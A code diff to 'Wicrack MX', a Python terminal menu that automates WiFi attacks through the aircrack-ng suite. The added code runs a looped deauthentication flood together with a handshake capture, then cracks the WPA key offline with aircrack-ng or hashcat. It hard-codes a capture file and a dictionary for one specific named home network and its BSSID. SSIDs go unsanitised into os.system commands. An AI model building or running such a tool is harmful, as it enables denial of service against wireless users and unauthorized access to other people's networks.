@@ -1,7 +1,7 @@
 from getmac import get_mac_address
 from wifi import Cell, Scheme
-import netifaces
-import curses, os #curses is the interface for capturing key presses on the menu, os launches the files
+import netifaces, curses, os #curses is the interface for capturing key presses on the menu, os launches the files
+import _thread
 screen = curses.initscr() #initializes a new window for capturing key presses
 curses.noecho() # Disables automatic echoing of key presses (prevents program from input each key twice)
 curses.cbreak() # Disables line buffering (runs each key as it is pressed rather than waiting for the return key to pressed)
@@ -21,6 +21,9 @@ EXITMENU = "exitmenu"
 INTSEL = "INTSEL" #select interface
 WIFISEL = "WIFISEL" #used to generat wifi target list
 WIFIOPT = "WIFIOPT" #select wifi target
+CAPSEL = "CAPSEL" #select capture files
+DICTSEL = "DICTSEL" #select Dictionary files
+MULTICOMMAND = "MULTICOMMAND"
 
 wifilist = []
 wilist = []
@@ -29,16 +32,30 @@ interfaces = netifaces.interfaces()
 selected_interface = ""
 interface_mode = ""
 target = ""
-target_BSSID =""
-interface_mac=""
+target_BSSID = ""
+interface_mac = ""
+target_channel = ""
+capture_file = "\"cap/AXTEL XTREMO-3E6E_62:02:71:88:3E:6F-01.cap\""
+password_list = "dictionary/axtel.txt"
 list2 = []
 
-for x in interfaces:
-  list2.append({ 'title': x, 'type': INTSEL, 'command': x })
+def runcom(com, state):
+  if state:
+    os.system(com)
+  
 
-#crates an empty menu data
-menu_data = {}
-#function to set the data of the menu, called everytime data changes
+# function to refresh all interfaces availables
+def refresh_options_list2():
+  global list2
+  global interfaces
+  interfaces = netifaces.interfaces()
+  list2 = []
+  for x in interfaces:
+    list2.append({ 'title': x, 'type': INTSEL, 'command': x })
+
+refresh_options_list2()
+
+# function to see all networks available
 def getObjectives(interface):
   cell = list(Cell.all(interface))
   body = []
@@ -57,23 +74,32 @@ def getObjectives(interface):
     body.append(row)
   return body
 
+#crates an empty menu data
+menu_data = {}
+#function to set the data of the menu, called everytime data changes
 def set_data():
     global menu_data
+    global list2
+    airmoncommand = 'airodump-ng -c '+ target_channel + ' --bssid ' + target_BSSID + ' -w ' + 'cap/' + '\"' + target + '\"' + '_' + target_BSSID + ' ' +  selected_interface 
+    airplaycommand = 'aireplay-ng --deauth 1000 -a ' + target_BSSID + ' -h ' + interface_mac + " " + selected_interface
     menu_data = {
       'title': "Wicrack MX", 'type': MENU, 'subtitle': "Selected interface: " + selected_interface + " Interface mode: " + interface_mode + " Target: " + target, 'options': [
         { 'title': "Select network interface", 'type': MENU, 'subtitle': "Selected interface: " + selected_interface, 'options': list2 },
-        { 'title': "Put interface in monitor mode", 'type': MAINCOMMAND, 'command': 'sudo airmon-ng start ' + selected_interface },
-        { 'title': "Put interface in managed mode", 'type': MAINCOMMAND, 'command': 'sudo airmon-ng stop ' + selected_interface + 'mon' },
-        { 'title': "Fix network issues", 'type': MAINCOMMAND, 'command': 'sudo airmon-ng check kill \n sudo service NetworkManager restart' },
-        { 'title': "Select Wifi target", 'type': WIFISEL, 'subtitle': "selected target: " + target, 'options': wifilist },
-        { 'title': "DOS attack menu", 'type': MENU, 'subtitle': "DOS attak menu", 'options': [
-          {'title': "DEAUTH", 'type': COMMAND, 'command': 'watch -n 3 sudo aireplay-ng --deauth 1000 -a ' + target_BSSID + ' -h ' + interface_mac + " " + selected_interface + 'mon' },
+        { 'title': "Put interface in monitor mode", 'type': MAINCOMMAND, 'command': 'sudo airmon-ng start ' + selected_interface, 'status': 'monitor' },
+        { 'title': "Put interface in managed mode", 'type': MAINCOMMAND, 'command': 'sudo airmon-ng stop ' + selected_interface, 'status': 'managed' },
+        { 'title': "Fix network issues", 'type': MAINCOMMAND, 'command': 'sudo airmon-ng check kill \n sudo service NetworkManager restart', 'status': 'null' },
+        { 'title': "Select Wifi target", 'type': WIFISEL, 'subtitle': "Selected target: " + target, 'options': wifilist },
+        { 'title': "DOS attack menu", 'type': MENU, 'subtitle': "DOS attack menu", 'options': [
+          {'title': "DEAUTH", 'type': COMMAND, 'command': 'watch -n 3 sudo aireplay-ng --deauth 1000 -a ' + target_BSSID + ' -h ' + interface_mac + " " + selected_interface },
         ]},
         { 'title': "Handshake/PMKID tools menu", 'type': MENU, 'subtitle': "DOS attack menu", 'options': [
-          {'title': "NO", 'type': EXITMENU, },
+          {'title': "Capture handshake with airplay", 'type': MULTICOMMAND, 'command1': 'sudo xterm -geometry 120x30 -e '+ airmoncommand, 'command2': 'sudo xterm -geometry 90x30 -e ' + airplaycommand   },
         ]},
         { 'title': "Offline WPA/WPA2 cracking menu", 'type': MENU, 'subtitle': "DOS attack menu", 'options': [
-          {'title': "NO", 'type': EXITMENU, },
+          {'title': "Select capture file", 'type': COMMAND, 'command': ''  },
+          {'title': "Select dictionary file file", 'type': COMMAND, 'command': ''  },
+          {'title': "Aircrack", 'type': COMMAND, 'command': 'aircrack-ng -w ' + password_list + ' -b ' + target_BSSID + ' ' + capture_file + ' -l ' + target + '.pswd'  },
+          {'title': "Hashcat", 'type': COMMAND, 'command': 'hashcat -m 2500 -o ' + password_list + ' ' + capture_file  },
         ]},
 		    { 'title': "Evil Twin attack menu", 'type': MENU, 'subtitle': "DOS attack menu", 'options': [
           {'title': "NO", 'type': EXITMENU, },
@@ -103,7 +129,6 @@ def runmenu(menu, parent):
     lastoption = "Exit"
   else:
     lastoption = "Return to %s menu" % parent['title']
-
   optioncount = len(menu['options']) # how many options in this menu
 
   pos = 0 #pos is the zero-based index of the hightlighted menu option. Every time runmenu is called, position returns to 0, when runmenu ends the position is returned and tells the program what opt$
@@ -159,6 +184,9 @@ def processmenu(menu, parent = None):
   global wilist
   global target_BSSID
   global interface_mac
+  global target_channel
+  global list2
+  global interfaces
   wifilist = []
   optioncount = len(menu['options'])
   exitmenu = False
@@ -184,6 +212,24 @@ def processmenu(menu, parent = None):
       curses.curs_set(0)
       os.system('echo > log ' + str(menu))
 
+    elif menu['options'][getin]['type'] == MULTICOMMAND:
+      #menu = menu_data
+      curses.def_prog_mode()    # save curent curses environment
+      os.system('reset')
+      screen.clear() #clears previous screen
+      #os.system('echo > log ' + (menu['options'][getin]['command1']))
+      com1= str(menu['options'][getin]['command1'])
+      com2= (menu['options'][getin]['command2'])
+      _thread.start_new_thread( runcom,(com1,True) )#command1
+      _thread.start_new_thread( runcom,(com2,True) )#command1
+       
+      screen.clear() #clears previous screen on key press and updates display based on pos
+      curses.reset_prog_mode()   # reset to 'current' curses environment
+      curses.curs_set(1)         # reset doesn't do this right
+      curses.curs_set(0)
+      os.system('echo > log ' + str(menu))
+
+
     elif menu['options'][getin]['type'] == MAINCOMMAND:
       #menu = menu_data
       curses.def_prog_mode()    # save curent curses environment
@@ -196,9 +242,15 @@ def processmenu(menu, parent = None):
       curses.curs_set(1)         # reset doesn't do this right
       curses.curs_set(0)
       #os.system('echo > log ' + str(menu))
-
+      if menu['options'][getin]['status'] == 'monitor' and selected_interface[-3:] != 'mon':
+        selected_interface = selected_interface + 'mon'
+      elif menu['options'][getin]['status'] == 'managed' and selected_interface[-3:] == 'mon':
+        selected_interface = selected_interface[0:-3]
+        os.system('sudo ifconfig ' + selected_interface + ' up')
 
     elif menu['options'][getin]['type'] == MENU:
+      refresh_options_list2()
+      set_data()
       screen.clear() #clears previous screen on key press and updates display based on pos
       menu = menu_data
       processmenu(menu['options'][getin], menu) # display the submenu
@@ -212,7 +264,7 @@ def processmenu(menu, parent = None):
 
       os.system('echo > log ' + str(wilist))
       for x in wilist:
-        wifilist.append({ 'title': x["SSID"], 'type': WIFIOPT, 'command': x["SSID"], 'BSSID': x["ADDRESS"]})
+        wifilist.append({ 'title': x["SSID"], 'type': WIFIOPT, 'command': x["SSID"], 'BSSID': x["ADDRESS"], 'CHANNEL': x['CHANNEL']})
       screen.clear() #clears previous screen on key press and updates display based on pos
       menu = menu_data
       screen.clear() #clears previous screen on key press and updates display based on pos
@@ -226,14 +278,20 @@ def processmenu(menu, parent = None):
     elif menu['options'][getin]['type'] == WIFIOPT:
       target = menu['options'][getin]['command']
       target_BSSID = menu['options'][getin]['BSSID']
+      target_channel= str(menu['options'][getin]['CHANNEL'])
       set_data()
       exitmenu = True #returns to main menu
       screen.clear()
       screen.refresh()
     
     elif menu['options'][getin]['type'] == INTSEL:
+      #displayMessage({"title": 'My New Message', "description": "Hello World"})
+      is_monitor = selected_interface[-3:]
+      if is_monitor == 'mon':
+        os.system('sudo airmon-ng stop ' + selected_interface)
+        selected_interface = selected_interface.replace('mon', '')
+        os.system('sudo ifconfig ' + selected_interface + ' up')
       selected_interface = menu['options'][getin]['command']
-      #is_monitor = selected_interface.find("mon")
       is_monitor = selected_interface[-3:]
       if is_monitor == 'mon':
         os.system('sudo airmon-ng stop ' + selected_interface)
@@ -248,6 +306,24 @@ def processmenu(menu, parent = None):
 
     elif menu['options'][getin]['type'] == EXITMENU:
       exitmenu = True
+
+# Display Message Function  
+def displayMessage(errorType):
+  screen.clear()
+  screen.border(0)
+  screen.addstr(2, 2, errorType['title'], curses.A_STANDOUT)
+  screen.addstr(4, 2, errorType['description'], curses.A_BOLD)
+  screen.addstr(5, 2, 'Press Enter to continue...', curses.A_BOLD)
+  screen.refresh()
+  screen.getch()
+  screen.clear()
+
+def listFilesInDirectory(path):
+  listFiles = []
+  for (dirPath, dirNames, fileNames) in os.walk(path):
+    listFiles.extend(fileNames)
+    break
+  return listFiles
 
 # Main program
 processmenu(menu_data)
